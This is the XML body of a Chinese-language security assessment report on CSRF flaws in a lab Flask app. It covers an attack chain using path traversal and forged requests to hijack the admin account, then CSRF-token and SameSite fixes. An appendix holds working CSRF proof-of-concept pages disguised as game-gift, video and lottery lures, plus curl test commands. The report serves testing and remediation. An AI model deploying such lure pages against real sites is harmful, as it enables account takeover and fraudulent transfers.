        <w:t>2. 登录后查看 /profile?user_id=3 获取自己的 user_id</w:t>
        <w:br/>
        <w:t>3. 查看 /page?name=../templates/profile.html</w:t>
        <w:br/>
        <w:t xml:space="preserve">   → 获取充值表单字段名：user_id, amount</w:t>
        <w:br/>
        <w:t xml:space="preserve">   → 获取修改密码字段名：username, new_password</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>阶段2：构造CSRF恶意页面</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>创建恶意HTML页面，同时包含两个CSRF攻击：</w:t>
        <w:br/>
        <w:t>1. 修改admin密码为 known_password</w:t>
        <w:br/>
        <w:t>2. 从admin账户向attacker充值 99999</w:t>
        <w:br/>
        <w:br/>
        <w:t>诱导管理员访问该页面，页面看起来像正常的视频/图片站。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>阶段3：攻击执行</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>管理员在登录状态下访问恶意页面 →</w:t>
        <w:br/>
        <w:t>浏览器自动发送修改密码请求 →</w:t>
        <w:br/>
        <w:t>浏览器自动发送充值请求 →</w:t>
        <w:br/>
        <w:t>admin密码被改为 "known_password" →</w:t>
        <w:br/>
        <w:t>攻击者使用新密码登录admin →</w:t>
        <w:br/>
        <w:t>admin账户被完全控制！</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>阶段4：权限维持与横向移动</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>以admin身份登录后：</w:t>
        <w:br/>
        <w:t>→ 查看 /profile?user_id=2 获取alice资料</w:t>
        <w:br/>
        <w:t>→ 通过 /change-password 修改alice密码</w:t>
        <w:br/>
        <w:t>→ 登录alice查看更多数据</w:t>
        <w:br/>
        <w:t>→ 遍历所有用户的 user_id 获取全部信息</w:t>
        <w:br/>
        <w:t>→ ✅ 完全控制整个系统！</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>九、修复方案</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.1 为充值接口添加CSRF Token</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>profile.html 修复：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;form method="POST" action="/recharge"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;input type="hidden" name="csrf_token"</w:t>
        <w:br/>
        <w:t xml:space="preserve">           value="{{ csrf_token() }}"&gt;  &lt;!-- 添加此行 --&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;input type="hidden" name="user_id" value="{{ user_id }}"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ...</w:t>
        <w:br/>
        <w:t>&lt;/form&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>app.py 修复：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>@app.route("/recharge", methods=["POST"])</w:t>
        <w:br/>
        <w:t>def recharge():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    # 添加CSRF验证</w:t>
        <w:br/>
        <w:t xml:space="preserve">    csrf_input = request.form.get("csrf_token", "")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if not validate_csrf_token(csrf_input):</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return "CSRF验证失败", 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ...</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.2 为修改密码接口添加CSRF Token</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>profile.html 修复：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;form method="POST" action="/change-password"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;input type="hidden" name="csrf_token"</w:t>
        <w:br/>
        <w:t xml:space="preserve">           value="{{ csrf_token() }}"&gt;  &lt;!-- 添加此行 --&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;input type="hidden" name="username" value="{{ user.username }}"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ...</w:t>
        <w:br/>
        <w:t>&lt;/form&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>app.py 修复：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>@app.route("/change-password", methods=["POST"])</w:t>
        <w:br/>
        <w:t>def change_password():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    # 添加CSRF验证</w:t>
        <w:br/>
        <w:t xml:space="preserve">    csrf_input = request.form.get("csrf_token", "")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if not validate_csrf_token(csrf_input):</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return "CSRF验证失败", 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ...</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.3 CSRF Token 通用实现</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># app.py - CSRF Token 核心代码</w:t>
        <w:br/>
        <w:br/>
        <w:t>def generate_csrf_token():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    """生成并存储CSRF Token到Session"""</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if "_csrf_token" not in session:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        session["_csrf_token"] = secrets.token_hex(16)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return session["_csrf_token"]</w:t>
        <w:br/>
        <w:br/>
        <w:t>def validate_csrf_token(token):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    """验证CSRF Token"""</w:t>
        <w:br/>
        <w:t xml:space="preserve">    stored = session.get("_csrf_token")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if not stored or not token:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return False</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return secrets.compare_digest(stored, token)</w:t>
        <w:br/>
        <w:br/>
        <w:t># 全局注入到模板</w:t>
        <w:br/>
        <w:t>app.jinja_env.globals["csrf_token"] = generate_csrf_token</w:t>
        <w:br/>
        <w:br/>
        <w:t># 在所有表单中添加</w:t>
        <w:br/>
        <w:t>&lt;input type="hidden" name="csrf_token" value="{{ csrf_token() }}"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>十、安全建议</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>10.1 CSRF防护标准方案</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>1. CSRF Token：每个表单生成唯一的Token，存储在Session中，提交时验证</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>2. SameSite Cookie：设置 SESSION_COOKIE_SAMESITE = "Strict"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>3. Referer验证：检查请求头中的Referer是否来自本站</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>4. 关键操作二次确认：修改密码/大额充值需要输入原密码或验证码</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>10.2 SameSite Cookie 详解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SameSite值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行为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安全等级</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>None</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>所有请求都携带Cookie</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>低</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Lax（当前设置）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>GET请求携带，POST不携带</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>中</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Strict</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>所有跨站请求都不携带Cookie</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>高</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>虽然 Lax 模式下 POST 请求不携带 Cookie，但对于 GET 请求的 CSRF 仍然有效。建议改为 Strict 模式，并在所有表单中添加 CSRF Token 实现双重防护。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>10.3 修复优先级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优先级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漏洞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操作</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>难度</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>P0 立即</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>充值接口CSRF</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>添加CSRF Token</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>低</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>P0 立即</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>修改密码接口CSRF</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>添加CSRF Token</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>低</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>附录：POC代码</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>以下是可以直接用于测试的CSRF攻击POC页面：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>POC 1: 充值CSRF</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;html&gt;</w:t>
        <w:br/>
        <w:t>&lt;body&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;h1&gt;🎮 免费游戏礼包&lt;/h1&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;p&gt;正在加载资源，请稍候...&lt;/p&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;form id="f" method="POST"</w:t>
        <w:br/>
        <w:t xml:space="preserve">        action="http://192.168.41.129:5000/recharge"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;input name="user_id" value="3"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;input name="amount" value="99999"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;/form&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;script&gt;document.getElementById("f").submit();&lt;/script&gt;</w:t>
        <w:br/>
        <w:t>&lt;/body&gt;</w:t>
        <w:br/>
        <w:t>&lt;/html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>POC 2: 修改密码CSRF</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;html&gt;</w:t>
        <w:br/>
        <w:t>&lt;body&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;h1&gt;📺 高清视频播放器&lt;/h1&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;form id="f" method="POST"</w:t>
        <w:br/>
        <w:t xml:space="preserve">        action="http://192.168.41.129:5000/change-password"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;input name="username" value="admin"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;input name="new_password" value="pwned123"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;/form&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;script&gt;document.getElementById("f").submit();&lt;/script&gt;</w:t>
        <w:br/>
        <w:t>&lt;/body&gt;</w:t>
        <w:br/>
        <w:t>&lt;/html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>POC 3: 组合攻击（充值+改密）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;html&gt;</w:t>
        <w:br/>
        <w:t>&lt;body&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;h1&gt;🎉 您获得了一次抽奖机会！&lt;/h1&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;p&gt;正在跳转...&lt;/p&gt;</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">  &lt;!-- 攻击1：将admin密码改为 attacker123 --&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;iframe name="f1" style="display:none"&gt;&lt;/iframe&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;form id="f1" method="POST" target="f1"</w:t>
        <w:br/>
        <w:t xml:space="preserve">        action="http://192.168.41.129:5000/change-password"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;input name="username" value="admin"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;input name="new_password" value="attacker123"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;/form&gt;</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">  &lt;!-- 攻击2：向攻击者账户充值 --&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;iframe name="f2" style="display:none"&gt;&lt;/iframe&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;form id="f2" method="POST" target="f2"</w:t>
        <w:br/>
        <w:t xml:space="preserve">        action="http://192.168.41.129:5000/recharge"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;input name="user_id" value="3"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;input name="amount" value="50000"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;/form&gt;</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">  &lt;script&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    document.getElementById("f1").submit();</w:t>
        <w:br/>
        <w:t xml:space="preserve">    setTimeout(function(){</w:t>
        <w:br/>
        <w:t xml:space="preserve">      document.getElementById("f2").submit();</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }, 500);</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;/script&gt;</w:t>
        <w:br/>
        <w:t>&lt;/body&gt;</w:t>
        <w:br/>
        <w:t>&lt;/html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>POC 测试命令（curl）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># 步骤1: 保存POC页面到文件</w:t>
        <w:br/>
        <w:t>echo '&lt;form id="f" method="POST" action="http://192.168.41.129:5000/recharge"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;input name="user_id" value="3"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;input name="amount" value="99999"&gt;</w:t>
        <w:br/>
        <w:t>&lt;/form&gt;</w:t>
        <w:br/>
        <w:t>&lt;script&gt;f.submit();&lt;/script&gt;' &gt; /tmp/csrf_poc.html</w:t>
        <w:br/>
        <w:br/>
        <w:t># 步骤2: 在浏览器打开该文件（需已登录目标系统）</w:t>
        <w:br/>
        <w:t># 或者通过攻击者服务器托管后发送给目标用户</w:t>
        <w:br/>
        <w:br/>
        <w:t># 步骤3: curl直接测试CSRF</w:t>
        <w:br/>
        <w:t>curl -X POST http://192.168.41.129:5000/recharge \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d "user_id=3&amp;amount=99999" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -b "session=admin的cookie"</w:t>
        <w:br/>
        <w:br/>
        <w:t># 步骤4: 验证结果</w:t>
        <w:br/>
        <w:t>curl http://192.168.41.129:5000/profile?user_id=3</w:t>
        <w:br/>
        <w:t># → 检查余额是否增加了99999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